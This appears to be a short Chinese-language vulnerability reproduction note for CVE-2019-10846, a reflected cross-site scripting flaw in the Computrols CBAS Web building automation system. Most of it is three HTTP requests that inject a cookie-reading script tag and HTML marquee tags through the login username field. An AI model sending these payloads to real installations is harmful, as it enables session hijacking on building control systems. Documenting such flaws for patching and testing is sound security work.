---
title: "（CVE-2019-10846）Computrols CBAS Web反射型xss"
id: zhfly2851
---

# （CVE-2019-10846）Computrols CBAS Web反射型xss

## 一、漏洞简介

Computrols CBAS Web是美国Computrols公司的一套楼宇自动化系统

## 二、漏洞影响

Computrols CBAS Web<=19.0.0

## 三、复现过程

### 1、

```
POST /cbas/index.php?m=auth&a=verifyid HTTP/1.1 `username="><script>confirm(document.cookie)</script>&submit_button=Send+Me+a+New+Password+Via+Email` 
```

### 2、

```
POST /cbas/index.php?m=auth&a=login HTTP/1.1 `username="><marquee>htmlinjection</marquee>&password=&challenge=60753c1b5e449de80e21472b5911594d&response=e16371917371b8b70529737813840c62` 
```

### 3、

```
GET /cbas/index.php?m=auth&a=login&username="><marquee>my milkshake brings all the boys to the yard.</marquee>&password=damn_right HTTP/1.1 
```